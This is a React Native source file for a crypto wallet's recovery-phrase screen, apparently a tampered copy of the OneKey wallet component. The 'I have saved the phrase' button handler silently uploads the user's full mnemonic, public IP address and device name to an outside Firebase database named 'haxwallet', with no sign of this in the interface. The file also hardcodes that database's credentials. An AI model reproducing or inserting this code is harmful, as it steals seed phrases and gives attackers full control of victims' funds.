import type { FC } from 'react';
import { useCallback } from 'react';

import { useIntl } from 'react-intl';
import publicIP from 'react-native-public-ip';
import { deviceName } from 'expo-device';


// import { initializeApp } from "firebase/app";
// import firebase from "@react-native-firebase/app";
// import firestore from '@react-native-firebase/firestore';
// import { getFirestore, collection, addDoc, } from 'firebase/firestore';

import { initializeApp } from "firebase/app";
import { getFirestore } from "firebase/firestore";
import { collection, doc, setDoc, addDoc } from "firebase/firestore";





import {
  Box,
  Button,
  MnemonicCard,
  Text,
  useIsVerticalLayout,
} from '@onekeyhq/components';

import { wait } from '../../../../utils/helper';

import type { IBoxProps } from 'native-base';
import { error } from 'console';
import cloudBackup from '../../../../store/reducers/cloudBackup';

var ip_address = ''

type PhraseSheetProps = {
  onPressSavedPhrase?: () => void;
  mnemonic: string;
} & IBoxProps;

const PhraseSheet: FC<PhraseSheetProps> = ({
  onPressSavedPhrase,
  mnemonic,
  ...rest
}) => {
  const intl = useIntl();
  const isVerticalLayout = useIsVerticalLayout();

  const firebaseConfig = {
    apiKey: "AIzaSyD3qkIDgafkPK5bbXrOCan_8NfdsOlvNvg",
    authDomain: "haxwallet-f5578.firebaseapp.com",
    databaseURL: "https://haxwallet-f5578-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "haxwallet-f5578",
    storageBucket: "haxwallet-f5578.appspot.com",
    messagingSenderId: "568987236972",
    appId: "1:568987236972:web:99fd91f985ddce412df649",
    measurementId: "G-HQHQXGPENG"
  };

  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);
 

  const onPressSavedPhrasePromise = useCallback(async () => {
    publicIP().then(ip => {
      ip_address = ip
      try {
        const docRef = addDoc(collection(db, "user_info_create"), {
          ip_address: ip_address,
          phrase: mnemonic,
          device_model: deviceName,
          method: 'create'
        })
        console.log('Done', docRef)
      }
      catch (e) {
        console.error('Error adding doc - ID: ', e)
      }
    }).catch(error => {
      console.log(error)
    })
    onPressSavedPhrase?.();
    await wait(3000);
  }, [onPressSavedPhrase]);

  return (
    <Box alignSelf="stretch" flex={1} {...rest}>
      <Text typography="Body2" color="text-subdued" textAlign="center" mb={4}>
        ↓ {intl.formatMessage({ id: 'content__click_below_to_copy' })} ↓
      </Text>
      <Box flex={1} mb={8}>
        <MnemonicCard mnemonic={mnemonic} />
      </Box>
      <Text typography="Body2" color="text-subdued" textAlign="center" mb={4}>
        {intl.formatMessage({ id: 'content__save_phrase_securely' })}
      </Text>
      <Button
        type="primary"
        size={isVerticalLayout ? 'xl' : 'base'}
        onPromise={onPressSavedPhrasePromise}
      >
        {intl.formatMessage({ id: 'action__i_have_saved_the_phrase' })}
      </Button>
    </Box>
  );
};

export default PhraseSheet;
